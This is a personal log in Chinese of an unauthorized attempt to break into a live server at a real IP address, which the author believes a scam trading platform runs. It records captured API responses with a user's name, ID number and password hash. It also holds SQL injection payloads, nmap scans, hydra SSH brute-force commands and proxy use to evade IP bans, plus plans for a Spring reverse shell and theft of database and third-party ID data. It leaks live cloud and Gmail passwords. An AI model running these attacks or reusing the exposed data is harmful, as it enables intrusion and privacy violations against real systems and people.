登录地址： http://117.149.243.239:9099/app/pages/login/index


登录接口： http://117.149.243.239:9099/apiApp/app/login

登录页面--sql注入

正确的登录

```
POST http://117.149.243.239:9099/apiApp/app/login

payload
{"loginName":"15711320691","loginPwd":"alison123"}

返回
{
    "msg": "操作成功",
    "code": 200,
    "productSetting": [
        {
            "id": 1,
            "szStockDisplay": true,
            "shStockDisplay": true,
            "kcStockDisplay": true,
            "cyStockDisplay": true,
            "bjsStockDisplay": true,
            "realNameDisplay": true,
            "stockMarginDisplay": false,
            "holidayDisplay": true,
            "buyFallDisplay": false,
            "checkPriceDisplay": false,
            "zeroNewApplyDisplay": false,
            "leverDisplay": false
        }
    ],
    "token": "27f9f409-4996-434f-976f-37a644b9de3e"
}

```

#### 获取用户

```
GET http://117.149.243.239:9099/apiApp/app/customer/getCustomerByName?loginName=15711320691
请求头：
    Token: e560b504-7a43-4db0-b312-79f012fc101b

返回
{
    "msg": "操作成功",
    "code": 200,
    "data": {
        "id": 6952,
        "agentId": 10413,
        "agentName": "四组",
        "loginName": "15711320691",
        "nickName": "新客",
        "realName": "黄勇",
        "idCard": "362228199207014015",
        "accountType": 1,
        "userAmt": 207756.80,
        "enableAmt": 0.14,
        "isLock": false,
        "isLogin": true,
        "regTime": "2023-06-28T12:08:37.000+0800",
        "regIp": "223.72.66.6",
        "cardImg1": "/uploadPath/cardImg/20230628/2d8ee267-2d73-481f-a9fa-d2598916d37f.jpg",
        "cardImg2": "/uploadPath/cardImg/20230628/c06b2a8b-7da2-4fe6-9e22-16e3b050f093.jpg",
        "isActive": 2,
        "tradingAmount": 0.00,
        "isAuthorize": 0,
        "applyBuyAmt": 1684642.00,
        "freezeAmt": 207990.00,
        "authMsg": null
    }
}
```

#### 获取用户信息
```
GET http://117.149.243.239:9099/api/v1/index/userinfo
请求头：
    Token: e560b504-7a43-4db0-b312-79f012fc101b

返回
{
    "code": 200,
    "msg": "成功",
    "data": {
        "id": 6952,
        "agent_id": 10413,
        "agent_name": "四组",
        "login_name": "15711320691",
        "login_pwd": "$2a$10$v.qqIhGHaZumTjmZ2D\/.2.wcPYZJwR1mUR\/AzGgowPW1G0o36lmp.",
        "nick_name": "新客",
        "real_name": "黄勇",
        "id_card": "362228199207014015",
        "account_type": 1,
        "user_amt": "207756.80",
        "enable_amt": "0.14",
        "is_lock": 0,
        "is_login": 1,
        "reg_time": "2023-06-28 12:08:37",
        "reg_ip": "223.72.66.6",
        "card_img1": "\/uploadPath\/cardImg\/20230628\/2d8ee267-2d73-481f-a9fa-d2598916d37f.jpg",
        "card_img2": "\/uploadPath\/cardImg\/20230628\/c06b2a8b-7da2-4fe6-9e22-16e3b050f093.jpg",
        "is_active": 2,
        "trading_amount": "0.00",
        "is_authorize": 0,
        "apply_buy_amt": "1684642.00",
        "freeze_amt": "207990.00",
        "auth_msg": null,
        "is_add_open": 0,
        "is_open": 0,
        "login_time": 1689220661,
        "token": "e560b504-7a43-4db0-b312-79f012fc101b",
        "credit_score": 600
    }
}
```

#### 获取登录时间
```
POST http://117.149.243.239:9099/api/v1/index/loginTime

payload
{"login_name":"15711320691","token":"27f9f409-4996-434f-976f-37a644b9de3e"}

返回
{"status_code":200,"message":"成功","token":"","data":[]}

```

#### 获取横幅banner

```
GET http://117.149.243.239:9099/apiApp/app/banner/list 

请求头
Token: 27f9f409-4996-434f-976f-37a644b9de3e 这个是登录返回的值

返回
{
    "msg": "操作成功",
    "code": 200,
    "data": [
        {
            "id": 29,
            "bannerUrl": "/uploadPath/banner/20230618/2733722b-d7a4-4c8f-9ac5-8aa605fff863.jpg",
            "isOrder": 0,
            "isPc": 1,
            "isM": 1,
            "addTime": "2023-01-29 19:36:43",
            "banTitle": null,
            "banDesc": null,
            "targetUrl": null
        },
        {
            "id": 30,
            "bannerUrl": "/uploadPath/banner/20230618/81185cec-fe1e-43ef-8851-c8da2d2e0552.jpg",
            "isOrder": 0,
            "isPc": 1,
            "isM": 1,
            "addTime": "2023-03-23 21:02:00",
            "banTitle": null,
            "banDesc": null,
            "targetUrl": null
        },
        {
            "id": 31,
            "bannerUrl": "/uploadPath/banner/20230618/bb440acf-6cc0-4859-adb1-7e1667fd0442.jpg",
            "isOrder": 0,
            "isPc": 1,
            "isM": 1,
            "addTime": "2023-03-23 21:02:11",
            "banTitle": null,
            "banDesc": null,
            "targetUrl": null
        },
        {
            "id": 32,
            "bannerUrl": "/uploadPath/banner/20230618/bc1f70c0-38bd-42a9-9751-6edc29711413.jpg",
            "isOrder": 0,
            "isPc": 1,
            "isM": 1,
            "addTime": "2023-06-04 21:41:18",
            "banTitle": null,
            "banDesc": null,
            "targetUrl": null
        }
    ]
}
```



尝试1： 失败
1' union select database(),2#
失败： 没有这个用户，页面做了11位字符限制

尝试2： 失败
ssh  root@117.149.243.239
失败： 端口22没开

尝试3： 
curl --request POST \
  --url http://117.149.243.239:9099/apiApp/app/login \
  --header 'Content-Type: application/json' \
  --header 'content-type: application/json' \
  --data '{"loginName":"1'\'' union select database(),2#","loginPwd":"123"}'

失败：
{"msg":"JSON parse error: Unexpected character ('5' (code 53)): was expecting double-quote to start field name; nested exception is com.fasterxml.jackson.core.JsonParseException: Unexpected character ('5' (code 53)): was expecting double-quote to start field name\n at [Source: (PushbackInputStream); line: 1, column: 47]","code":500}


确定后台使用 Java + Spring 开发

尝试4：
http://117.149.243.239:9099/oauth/authorize?response_type=${2*2}&client_id=acme&scope=openid&redirect_uri=http://test

失败： 404 not found --nginx

尝试5：
http://117.149.243.239:9099/apiApp/oauth/authorize?response_type=${2*2}&client_id=acme&scope=openid&redirect_uri=http://test

失败： 400 --bad request

发现对应的nginx配置地址是: /apiApp

目的： 找出服务器用户root密码,数据库用户密码root, 对应的系统中用户所有信息user
然后抓出对应的ip地址，登录人

美洽，企业id
服务器117.149.243.239

收集对应的请求
```
/apiApp/app/banner/list
/apiApp/app/news/page?pageNum=1&type=-1
/apiApp/app/message/getNum 
/apiApp/app/article/list
/apiApp/app/product/info
/apiApp/app/position/getStockInfo?stockCode=sh000001,sz399001,sz399006 
/apiApp/app/login
/apiApp/app/customer/getCustomerByName?loginName=15711320691
/api/v1/index/loginTime
/api/v1/index/userinfo
/api/v1/index/isOpen?login_name=15711320691
/apiApp/app/withdraw/getList?current=1&size=10&total=0
/apiApp/app/dict/type/agent_withdraw_status
/apiApp/app/logout?token=e560b504-7a43-4db0-b312-79f012fc101b
/apiApp/app/site/info


Host: static.meiqia.com/fe-widget/v1.4.86.prod.20230712_46/static/new-chat.mp3

```

尝试6：
/api/v1/index/userinfo
获取到密码， 加密方式是 bcrypt

端口扫描
Initiating Parallel DNS resolution of 1 host. at 15:11
Completed Parallel DNS resolution of 1 host. at 15:11, 8.04s elapsed
Initiating SYN Stealth Scan at 15:11
Scanning 117.149.243.239 [1000 ports]
Discovered open port 3306/tcp on 117.149.243.239
Discovered open port 80/tcp on 117.149.243.239
Discovered open port 53/tcp on 117.149.243.239
Discovered open port 21/tcp on 117.149.243.239
Discovered open port 443/tcp on 117.149.243.239
Increasing send delay for 117.149.243.239 from 0 to 5 due to 63 out of 157 dropped probes since last increase.
Increasing send delay for 117.149.243.239 from 5 to 10 due to 11 out of 26 dropped probes since last increase.
Discovered open port 9099/tcp on 117.149.243.239
Discovered open port 888/tcp on 117.149.243.239
Completed SYN Stealth Scan at 15:12, 38.90s elapsed (1000 total ports)
Initiating Service scan at 15:12

尝试7:
现在发现访问不了，说明对方把我的Ip地址屏蔽了，间接说明对应的服务器有人在运营，说明对方有开发运营人员在处理

现在尝试换一个ip代理进行攻击


做一个spring-web接口，获取一下访问者的ip
本地测试
公网测试

然后对指定ip进行限制-linux 
限制单个IP访问的命令
iptables -I INPUT -s 59.151.119.180 -j DROP

tengxun 
root
Asd@1qwe
ip: 
175.178.234.145

我的gmail账户：  gavin.lison@gmail.com  Yang@123xin


本地的IP:   223.72.65.54  2023-07-14   这个IP 被诈骗人员禁了
2023-07-15  223.72.57.19
2023-07-15 1:05 223.72.57.19

尝试8：
nmap -T4 -A -v 117.149.243.239
PORT      STATE  SERVICE    VERSION
20/tcp    closed ftp-data
21/tcp    open   tcpwrapped
22/tcp    closed ssh
53/tcp    open   domain?
80/tcp    open   tcpwrapped
443/tcp   open   tcpwrapped
3306/tcp  open   tcpwrapped
9099/tcp  open   tcpwrapped
27000/tcp closed flexlm0

2023-07-14 09:14 刚操作，发现又被禁了
刚操作了一会，

尝试9:

使用ip代理，py代码访问 http://175.178.234.145:8099/apiApp
无法获取到结果 

尝试10： 访问  117.149.243.239 
返回 502 bad gateway
说明对方服务器做了限制

ping  117.149.243.239 
无法ping 通

尝试11： 
2023-07015 01:33 开始
nmap -T4 -A -v 117.149.243.239

Discovered open port 21/tcp on 117.149.243.239
Discovered open port 80/tcp on 117.149.243.239
Discovered open port 443/tcp on 117.149.243.239
Discovered open port 3306/tcp on 117.149.243.239
Discovered open port 53/tcp on 117.149.243.239
Discovered open port 9099/tcp on 117.149.243.239
Discovered open port 888/tcp on 117.149.243.239

发现

尝试12：
发现可用代理ip: 36.138.56.214:3128

尝试13： 利用spring漏洞实现反弹shell,下载对应的所有文件到本地，
特别是应用程序 和 Mysql 数据文件，对其进行分析
然后分析出相关的用户信息
然后抓取美洽服务器的数据库文件，拿到对应的美洽官网中指定企业id的身份证信息

这些背后都需要将自己的IP 影藏了
需要专门测试一下如何隐藏自己IP

尝试14：
发现开启了 888 端口，
查询之后，后台使用的 phpMyAdmin 管理平台

尝试复现 宝塔7.4.2版本的漏洞，查出对应的数据库信息

访问： 117.149.243.239:888/pma 提示404, 发现这个漏洞被诈骗分子修复

尝试15：
通过 nmap 扫描端口，
20/tcp    closed ftp-data
21/tcp    open   tcpwrapped
22/tcp    closed ssh
53/tcp    open   domain?
80/tcp    open   tcpwrapped
443/tcp   open   tcpwrapped
3306/tcp  open   tcpwrapped
9099/tcp  open   tcpwrapped
27000/tcp closed flexlm0

888端口关闭了

尝试16:
任何命令都需要添加代理ip， 比如：
curl -x 47.93.173.50:8089 -v 175.178.234.145:9099

尝试17：
利用腾讯云服务器进行 nmap 

尝试18：

利用hydra 进行 暴力破解

hydra -l root  -P customdict.txt  -vV -t 2 -e ns  ssh://192.168.1.5  -o  ok.txt

hydra -l root  -P dict.txt  -vV -t 4 -e ns  ssh://117.149.243.239  -o  ok.txt

proxychains4 hydra -l root  -P dict.txt  -vV -t 4 -e ns  ssh://117.149.243.239  -o  ok.txt

尝试19:

https://blog.csdn.net/SYJ_361/article/details/121952135

尝试20：

对应的网站报错, redis connect timeout,无法使用了，只能对警察抱希望了???
